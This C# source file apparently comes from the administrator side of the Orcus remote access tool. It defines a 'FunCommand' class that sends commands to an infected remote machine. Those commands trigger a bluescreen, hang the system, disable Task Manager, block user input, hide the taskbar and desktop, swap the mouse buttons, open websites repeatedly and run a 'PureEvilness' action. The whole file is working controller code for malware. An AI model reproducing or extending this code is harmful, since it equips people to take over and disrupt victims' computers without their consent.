using System;
using Orcus.Shared.Communication;
using Orcus.Shared.Commands.FunActions;
using System.Text;
using System.Linq;
using System.Collections.Generic;

namespace Orcus.Administration.App
{
	class FunCommand : Command
	{
		public override void ResponseReceived(byte[] parameter)
		{
			var result = (CommandResponse)parameter[0];
			var command = (FunActionsCommunication)parameter[1];
			switch (result)
			{
			case CommandResponse.Failed:
				if(NewMessage != null)
					NewMessage.Invoke(this, (parameter.Length > 2
						? string.Format("Failed: {0} - {1}", command, Encoding.UTF8.GetString(parameter, 2, parameter.Length -2))
						: string.Format("Failed: {0}", command)));
				break;
			case CommandResponse.Warning:
				break;
			case CommandResponse.Successful:
				if(NewMessage != null)
					NewMessage.Invoke(this, string.Format("Sucessfully done: {0}", command));
				break;
			default:
				throw new ArgumentOutOfRangeException();
			}
		}

		public event EventHandler<string> NewMessage; 

		public void TriggerBluescreen()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.TriggerBluescreen });
		}

		public void HideTaskbar()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.HideTaskbar });
		}

		public void ShowTaskbar()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.ShowTaskbar });
		}

		public void HoldMouse(int seconds)
		{
			var package = new List<byte> { (byte)FunActionsCommunication.HoldMouse };
			package.AddRange(BitConverter.GetBytes(seconds));
			ConnectionInfo.SendCommand(this, package.ToArray());
		}

		public void DisableMonitor()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.DisableMonitor });
		}

		public void Shutdown()
		{
			ConnectionInfo.SendCommand (this, new[] { (byte)FunActionsCommunication.Shutdown });
		}

		public void LogOff()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.LogOff });
		}

		public void Restart()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.Restart });
		}

		public void RotateScreen(RotateDegrees degrees)
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.RotateScreen, (byte)degrees });
		}

		public void PureEvilness()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.PureEvilness });
		}

		public void StopPureEvilness()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.StopPureEvilness });
		}

		public void ChangeKeyboardLayout(byte id)
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.ChangeKeyboardLayout, id });
		}

		public void OpenWebsite(string url, int times)
		{
			var package = new List<byte> { (byte)FunActionsCommunication.OpenWebsite };
			package.AddRange(BitConverter.GetBytes(times));
			package.AddRange(Encoding.UTF8.GetBytes(url));
			ConnectionInfo.SendCommand(this, package.ToArray());
		}

		public void HideDesktop()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.HideDesktop });
		}

		public void ShowDesktop()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.ShowDesktop });
		}

		public void HideClock()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.HideClock });
		}

		public void ShowClock()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.ShowClock });
		}

		public void DisableTaskmanager()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.DisableTaskmanager });
		}

		public void EnableTaskmanager()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.EnableTaskmanager });
		}

		public void SwapMouseButtons()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.SwapMouseButtons });
		}

		public void RestoreMouseButtons()
		{
			ConnectionInfo.SendCommand(this, new[] { (byte)FunActionsCommunication.RestoreMouseButtons });
		}

		public void BlockUserInput(int seconds)
		{
			var package = new List<byte> { (byte)FunActionsCommunication.DisableUserInput };
			package.AddRange(BitConverter.GetBytes(seconds));
			ConnectionInfo.SendCommand(this, package.ToArray());
		}

		public void HangSystem()
		{
			ConnectionInfo.SendCommand(this, new[] {(byte) FunActionsCommunication.HangSystem});
		}

		protected override uint GetId()
		{
			return 8;
		}
	}
}